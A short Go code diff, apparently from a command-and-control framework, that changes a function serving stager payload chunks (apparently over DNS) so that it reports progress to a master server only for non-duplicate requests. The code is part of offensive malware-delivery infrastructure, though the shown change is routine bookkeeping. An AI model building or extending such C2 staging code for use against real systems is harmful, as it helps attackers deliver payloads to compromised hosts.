@@ -1649,14 +1649,17 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 	}
 
 	// Report to Master async (fire-and-forget for UI tracking only)
-	go func() {
-		if err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP); err != nil {
-			// Silently fail - Master tracking is nice-to-have, not critical
-			if c2.debug {
-				logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
+	// IMPORTANT: Only report if not a duplicate DNS retry!
+	if !isDuplicate {
+		go func() {
+			if err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP); err != nil {
+				// Silently fail - Master tracking is nice-to-have, not critical
+				if c2.debug {
+					logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
+				}
 			}
-		}
-	}()
+		}()
+	}
 
 	return fmt.Sprintf("CHUNK|%s", chunkData)
 }
